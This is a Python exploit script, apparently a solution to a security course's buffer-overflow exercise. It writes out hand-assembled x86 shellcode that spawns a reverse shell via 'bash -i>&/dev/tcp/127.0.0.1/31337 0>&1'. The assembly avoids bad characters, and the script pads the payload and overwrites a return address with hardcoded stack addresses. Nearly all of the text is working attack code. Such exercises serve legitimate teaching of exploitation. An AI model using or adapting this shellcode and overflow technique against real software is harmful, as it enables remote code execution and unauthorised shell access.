#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here

'''
Explanation: 
// YOUR ASSEMBLY GOES HERE
xor    %eax, %eax # clear eax

push   %eax # push zero termination
push $0x68736162
push $0x2f2f2f2f
push $0x6e69622f # /bin/bash padded to alignment pushed to stack
mov %esp,%ebx # ebx = str_location

push %eax   #push null terminator
push $0x31263e30 # push str 0>&1

#push $0x20202020
xor %ebp, %ebp # clear ebp
add $0x10101010, %ebp 
add $0x10101010, %ebp # adding two half of a four space
push %ebp # make four aligned space on stack without using space char (no longer needed but not removed)

push $0x37333331
push $0x332f312e
push $0x302e302e
push $0x3732312f
push $0x7063742f
push $0x7665642f
push $0x263e692d # push -I>&/dev/tcp/127.0.0.1/31337 to stack

#push $0x20202020
#xor %ebp, %ebp
#add $0x10101010, %ebp
#add $0x10101010, %ebp
push %ebp # same way to push spaces

push $0x68736162 #push bash

mov %esp, %ebp # ebp = arg2

push %eax   #push null
push $0x6368682d #push string -hhc
mov %esp, %ecx # ecx = arg2

push %eax   # push null
push %ebp
push %ecx # push arg2,1,0 to stack
push %ebx       #arg0
mov %esp, %ecx # ecx = start of argv we just built above

xor   %edx,%edx      # zero edx
push   %ebx      # zero ebx
#mov $11, %eax
xor   %eax,%eax      # avoid vertical tab character... the dumb way
inc %eax
inc %eax
inc %eax
inc %eax
inc %eax
inc %eax
inc %eax
inc %eax
inc %eax
inc %eax
inc %eax
int    $0x80 # call system
'''

# Payload is /bin/bash -c "bash -i>&/dev/tcp/127.0.0.1/31337 0>&1"
# shellcode=b'j\x0bj\x0bX\x99Rhbashh////h/bin\x89\xe3RS\x89\xe1\xcd\x80#\xd1\xbc'
shellcode=b'1\xc0Phbashh////h/bin\x89\xe3Ph0>&11\xed\x81\xc5\x10\x10\x10\x10\x81\xc5\x10\x10\x10\x10Uh1337h.1/3h.0.0h/127h/tcph/devh-i>&Uhbash\x89\xe5Ph-hhc\x89\xe1PUQS\x89\xe11\xd2S1\xc0@@@@@@@@@@@\xcd\x80'
addr_shell = pack('<I', 0xfffecef8)
addr_EIP = pack('<I', 0xfffed70c)

align = 9-4
pad = 2048-align-1
sys.stdout.buffer.write(b"\'")
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b'\xFF'*(pad-len(shellcode)))
sys.stdout.buffer.write(b'\xDD' * align)
sys.stdout.buffer.write(addr_shell)  # a
sys.stdout.buffer.write(addr_EIP)  # p
sys.stdout.buffer.write(b"\'")
